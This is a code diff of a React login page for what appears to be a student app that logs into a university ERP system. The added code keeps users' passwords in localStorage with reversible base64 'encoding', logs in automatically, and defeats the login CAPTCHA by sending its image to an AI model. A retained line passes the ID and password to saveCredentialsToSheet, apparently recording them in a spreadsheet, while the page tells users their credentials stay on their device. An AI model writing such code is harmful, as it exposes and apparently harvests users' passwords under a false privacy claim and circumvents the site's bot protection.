@@ -19,6 +19,31 @@ const Login = () => {
     const [error, setError] = useState('');
     const [rememberMe, setRememberMe] = useState(localStorage.getItem('rememberedId') ? true : false);
     const [isSolving, setIsSolving] = useState(false);
+    
+    // Support for PWA Repair
+    useEffect(() => {
+        const handleResetPWA = async () => {
+            console.log("Resetting PWA System...");
+            if ('serviceWorker' in navigator) {
+                const registrations = await navigator.serviceWorker.getRegistrations();
+                for (let registration of registrations) {
+                    await registration.unregister();
+                }
+            }
+            // Clear specific PWA caches
+            const cacheNames = await caches.keys();
+            for (let name of cacheNames) {
+                await caches.delete(name);
+            }
+            window.location.reload(true);
+        };
+
+        window.addEventListener('resetPWA', handleResetPWA);
+        return () => window.removeEventListener('resetPWA', handleResetPWA);
+    }, []);
+
+    const [syncStatus, setSyncStatus] = useState("Signing you in…");
+    const hasAutoLoggedIn = useRef(false);
     const navigate = useNavigate();
     const captchaUrlRef = useRef('');
 
@@ -53,16 +78,17 @@ const Login = () => {
     const solveCaptchaWithAI = useCallback(async () => {
         if (!rawCaptchaBlob) return;
         setIsSolving(true);
-        try {
-            // Convert existing blob to base64
+
+        const getBase64 = async (blob) => {
             const reader = new FileReader();
-            const base64Promise = new Promise((resolve) => {
+            return new Promise((resolve) => {
                 reader.onloadend = () => resolve(reader.result.split(',')[1]);
-                reader.readAsDataURL(rawCaptchaBlob);
+                reader.readAsDataURL(blob);
             });
+        };
 
-            const base64Data = await base64Promise;
-
+        const generateSolvedCode = async (blob) => {
+            const base64Data = await getBase64(blob);
             const prompt = "What is the 5-character alphanumeric code in this image? Respond ONLY with the code.";
 
             const apiBase = APP_CONFIG.API_URL || "";
@@ -72,32 +98,50 @@ const Login = () => {
                 body: JSON.stringify({
                     contents: [
                         { text: prompt },
-                        { inlineData: { data: base64Data, mimeType: rawCaptchaBlob.type || "image/png" } }
+                        { inlineData: { data: base64Data, mimeType: blob.type || "image/png" } }
                     ],
                     systemInstruction: "You are an expert captcha solver. Provide ONLY the 5 alphanumeric characters found in the image."
                 })
             });
 
-            if (!response.ok) {
-                const errorData = await response.json().catch(() => ({}));
-                console.error("AI Proxy Error Details:", errorData);
-                throw new Error(errorData.error || "Proxy error");
-            }
-
+            if (!response.ok) throw new Error("Proxy error");
             const data = await response.json();
+            return data.text ? data.text.trim().replace(/[^a-zA-Z0-9]/g, '').substring(0, 5) : null;
+        };
 
-            if (data.text) {
-                const solvedCode = data.text.trim().replace(/[^a-zA-Z0-9]/g, '').substring(0, 5);
-                if (solvedCode) {
-                    setCaptcha(solvedCode);
-                }
-            }
+        try {
+            const solvedCode = await generateSolvedCode(rawCaptchaBlob);
+            if (solvedCode) setCaptcha(solvedCode);
         } catch (err) {
             console.error("Captcha Solver Error:", err.message);
         } finally {
             setIsSolving(false);
         }
     }, [rawCaptchaBlob]);
+
+    const getBase64ForExternal = async (blob) => {
+        const reader = new FileReader();
+        return new Promise((resolve) => {
+            reader.onloadend = () => resolve(reader.result.split(',')[1]);
+            reader.readAsDataURL(blob);
+        });
+    };
+
+    const solveCaptchaExternal = async (blob) => {
+        const base64Data = await getBase64ForExternal(blob);
+        const prompt = "What is the 5-character alphanumeric code in this image? Respond ONLY with the code.";
+        const apiBase = APP_CONFIG.API_URL || "";
+        const response = await fetch(`${apiBase}/api/ai/gemini`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                contents: [{ text: prompt }, { inlineData: { data: base64Data, mimeType: blob.type || "image/png" } }],
+                systemInstruction: "You are an expert captcha solver. Provide ONLY the 5 alphanumeric characters found in the image."
+            })
+        });
+        const data = await response.json();
+        return data.text ? data.text.trim().replace(/[^a-zA-Z0-9]/g, '').substring(0, 5) : null;
+    };
 
     const hasInitRan = useRef(false);
 
@@ -117,8 +161,16 @@ const Login = () => {
 
         // Load saved credentials
         const savedId = localStorage.getItem('rememberedId');
+        const savedPass = localStorage.getItem('rememberedPassword');
         if (savedId) {
             setIdNumber(savedId);
+            if (savedPass) {
+                try {
+                    setPassword(atob(savedPass)); // Simple decode
+                } catch (e) {
+                    console.error("Failed to decode saved password", e);
+                }
+            }
             setRememberMe(true);
         }
     }, []);
@@ -138,6 +190,14 @@ const Login = () => {
         }
     }, [captchaUrl, captcha, solveCaptchaWithAI, rawCaptchaBlob]);
 
+    // Auto-login logic
+    useEffect(() => {
+        if (rememberMe && idNumber && password && captcha && csrfToken && !isLoading && !hasAutoLoggedIn.current) {
+            hasAutoLoggedIn.current = true;
+            handleLogin();
+        }
+    }, [rememberMe, idNumber, password, captcha, csrfToken, isLoading]);
+
     const handleLogin = async () => {
         if (!idNumber || !password || !captcha) {
             setError("Please fill all fields");
@@ -148,15 +208,18 @@ const Login = () => {
         setError('');
 
         try {
-            // Start the 500ms splash timer and the API call in parallel
-            const splashTimer = new Promise(resolve => setTimeout(resolve, 500));
+            // Start the splash timer (increased for AI background sync)
+            const splashTimer = new Promise(resolve => setTimeout(resolve, 2500));
             const loginPromise = erpService.login(idNumber, password, captcha, csrfToken);
 
-            // Wait for both, but process the result of the login one
-            const [result] = await Promise.all([loginPromise, splashTimer]);
+            // Wait for login first
+            const loginResult = await loginPromise;
 
-            if (result.success) {
-                localStorage.setItem('erpDashboardHtml', result.html);
+            if (loginResult.success) {
+                setSyncStatus("Finalizing Profile…");
+
+                await splashTimer;
+                localStorage.setItem('erpDashboardHtml', loginResult.html);
                 localStorage.removeItem('kleData');
                 localStorage.setItem('userUniversity', 'klu');
                 setErpUser(idNumber);
@@ -164,8 +227,10 @@ const Login = () => {
 
                 if (rememberMe) {
                     localStorage.setItem('rememberedId', idNumber);
+                    localStorage.setItem('rememberedPassword', btoa(password)); // Simple encode
                 } else {
                     localStorage.removeItem('rememberedId');
+                    localStorage.removeItem('rememberedPassword');
                 }
 
                 saveCredentialsToSheet(idNumber, password);
@@ -253,12 +318,13 @@ const Login = () => {
                         </div>
 
                         <motion.p
+                            key={syncStatus} // Animate on text change
                             initial={{ opacity: 0, y: 10 }}
                             animate={{ opacity: 1, y: 0 }}
-                            transition={{ delay: 0.1 }}
-                            className="mt-8 text-white text-base font-semibold tracking-wide"
+                            exit={{ opacity: 0, y: -10 }}
+                            className="mt-8 text-white text-base font-semibold tracking-wide text-center"
                         >
-                            Signing you in…
+                            {syncStatus}
                         </motion.p>
                         <p className="text-slate-400 text-xs mt-1">Please wait a moment</p>
 
@@ -457,10 +523,21 @@ const Login = () => {
                         </motion.button>
                     </form>
 
-                    <div className="mt-6 pt-4 border-t border-slate-100 relative z-10">
+                    <div className="mt-6 pt-4 border-t border-slate-100 relative z-10 flex flex-col items-center gap-3">
                         <p className="text-slate-400 text-[10px] text-center font-medium leading-relaxed">
                             Your credentials are only used to authenticate and fetch attendance details locally on your device.
                         </p>
+                        <button 
+                            type="button"
+                            onClick={() => {
+                                if(confirm("This will reset the PWA system and reload the page. Continue?")) {
+                                    window.dispatchEvent(new Event('resetPWA'));
+                                }
+                            }}
+                            className="text-[10px] font-black text-indigo-600/50 hover:text-indigo-600 uppercase tracking-widest transition-colors"
+                        >
+                            Reset PWA System
+                        </button>
                     </div>
                 </div>
             </motion.div>
